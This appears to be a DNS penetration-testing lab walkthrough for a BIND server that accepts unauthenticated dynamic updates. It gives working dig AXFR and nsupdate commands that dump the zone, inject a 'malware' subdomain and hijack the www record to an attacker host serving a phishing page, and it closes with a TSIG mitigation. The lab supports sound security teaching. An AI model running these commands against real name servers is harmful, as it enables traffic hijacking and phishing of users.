# Dynamic DNS Update Injection Attack (DDNS)

BIND supports dynamic updates (RFC 2136) which allow authorized clients to add, delete, or modify resource records. If an administrator enables `allow-update` without restricting it to secure IPs (or without using TSIG keys), an attacker can directly inject their own IP into the zone.

The attack occures when admin leaves `allow-update` open to `any`, which allows any one to update DNS records directly through Authoritative Server.

## Attack Guide

### find the Authoritative Server's Hostname

From Kali (`192.168.34.129`), the attacker sends a query for the NS (Name Server) records of `dnspentest.lab`:

```bash
dig @192.168.34.132 dnspentest.lab NS
```

**The resolver's response:**

```textile
;; ANSWER SECTION:
dnspentest.lab.        3600    IN      NS      ns1.dnspentest.lab.
```

### Resolves that hostname to an IP

The attacker then asks the resolver for the A record of that hostname:

```bash
dig @192.168.34.132 ns1.dnspentest.lab A
```

**The resolver's response:**

```textile
;; ANSWER SECTION:
ns1.dnspentest.lab.    3600    IN      A       192.168.34.133
```

now you have the exact IP (`192.168.34.133`) to launch Zone transfer and Dynamic Update Injection attack.

#### Attack Phase 01: Zone Tranfer Attack

Zone transfer attack helps to recon the available records under zone file which can potentially expose huge list of targets.

On Kali (192.168.34.129), run this single command:

```bash
dig @192.168.34.133 dnspentest.lab AXFR
```

Observe the Results**

You will receive the complete zone file:

> Figure

### 

#### Attack Phase 02: Dynamic DNS Update

Kali comes with `nsupdate` pre-installed. We will use it to send an authenticated update request directly to the authoritative server (`192.168.34.133`).

##### Option A: Inject a NEW malicious subdomain (Backdoor)

add `malware.dnspentest.lab` pointing to your Kali IP.

Create an update script:

```bash
cat > ddns_add.txt <<EOF
server 192.168.34.133
zone dnspentest.lab.
update add malware.dnspentest.lab 60 A 192.168.34.129
send
EOF
```

- `60` defines 60 sec, after 60 seconds injected update will not be available.

Execute it: 

```bash
nsupdate -v ddns_add.txt
```

Verify it worked immediately:

```bash
dig @192.168.34.133 malware.dnspentest.lab A
```

Expected output: 

```textile
malware.dnspentest.lab. 60 IN A 192.168.34.129
```

---

#### Option B: OVERWRITE an existing record (The "Hijack")

Redirect all web traffic from the real server (`192.168.34.134`) to your Kali machine.

Create an update script to replace the `www` A record:

```bash
cat > ddns_hijack.txt <<EOF
server 192.168.34.133
zone dnspentest.lab.
update delete www.dnspentest.lab A
update add www.dnspentest.lab 60 A 192.168.34.129
send
EOF
```

Execute it:

```bash
nsupdate -v ddns_hijack.txt
```

Verify the hijack:

```bash
dig @192.168.34.133 www.dnspentest.lab A
```

Expected output: 

```textile
www.dnspentest.lab. 60 IN A 192.168.34.129
```

#### Host Phising Page on kali

Create webpage similar to target's webpage

```bash
sudo nano index.html
```

Add:

```html
<!DOCTYPE html>
<html>
<body>
<h1> Wellcome to Malicious suddomain of DN53CLab</h1>
</body>
</html>
```

Create Python server to host ur webpage

```bash
sudo python3 -m http.server 80
```

<img title="" src="https://github.com/Incogn1mu5/DN53CLab/blob/main/Inventory/Screenshots/DDNS/DDNS_01.png" alt="DN53CLab_Banner" width="1484" height="552">



When victim use nslookup to find IP of dnspentest.lab, victim gets ip of kali:

<img title="" src="https://github.com/Incogn1mu5/DN53CLab/blob/main/Inventory/Screenshots/DDNS/DDNS_03.png" alt="DN53CLab_Banner" width="1484" height="552">



What happens next?

1. **The victim (Windows VM) visits** `http://www.dnspentest.lab` in their browser.

2. **Victim's OS queries the Resolver** (`192.168.34.132`) for `www.dnspentest.lab`.

3. **Resolver queries your Authoritative Server** (`192.168.34.133`).

4. **Authoritative Server returns `192.168.34.129`** (your Kali IP) instead of `192.168.34.134` (the real web server).

5. **The victim's browser connects to Kali's IP** on port 80. The victim will see your malicious webpage instead of the real one.

<img title="" src="https://github.com/Incogn1mu5/DN53CLab/blob/main/Inventory/Screenshots/DDNS/DDNS_02.png" alt="DN53CLab_Banner" width="1484" height="552">





This attack can survive 'rndc reload' command and even system restart because the `.jnl` file is preserved, BIND reloads the base zone and *replays* all the dynamic updates from the journal. Your injected `malware` and hijacked `www` records **survive** a `rndc reload` and since the `.jnl` file is stored on disk even full system restart can't remove injected update, BIND is designed this way so that legitimate dynamic DNS updates (e.g., a web server updating its own IP) do not disappear when the admin reloads the configuration.

## DDNS vs DNS Hijack

**Dynamic DNS (DDNS)** is a legitimate network feature, whereas **DNS Hijacking** is a cyberattack.

However, a vulnerability in DDNS can be used as a method to achieve a DNS hijack.

### Dynamic DNS (DDNS) — *The Service*

- **What it is:** A legitimate technology that automatically updates a DNS server's resource records in real time whenever an IP address changes. It is widely used by home networks, small businesses, and remote workers whose Internet Service Providers (ISPs) assign dynamic IP addresses.

- **Purpose:** Operational utility—it ensures a domain name (e.g., `myhome.ddns.net`) always points to the correct, changing IP address without manual admin work.

### DNS Hijacking — *The Cyberattack*

- **What it is:** An attack strategy where an adversary secretly redirects legitimate DNS traffic to an attacker-controlled server.

- **Purpose:** Malicious activity—used to host phishing pages, steal user credentials, perform Man-in-the-Middle (MitM) attacks, or cause service outages.

### How They Relate

Think of **DDNS as a tool** and **DNS Hijacking as an attack goal**:

- **DDNS is just one potential path to hijacking:** If DDNS lacks security controls (such as TSIG authentication), an attacker can send malicious update commands (*DDNS Update Injection*) to modify a record. This alters where the domain points, resulting in a **DNS Hijack**.

- **DNS Hijacking can happen without DDNS:** Attackers can hijack DNS through many other vectors that have nothing to do with DDNS, such as compromising a domain registrar account, poisoning a local DNS cache, modifying a device's local `hosts` file, or altering router DNS settings.

##### Mitigation:

```
key "ddns-key" {
    algorithm hmac-sha256;
    secret "base64-generated-secret==";
};

zone "dnspentest.lab" {
    type master;
    file "/etc/bind/db.dnspentest.lab";
    allow-update { key "ddns-key"; };   // only holders of this key can update
};
```
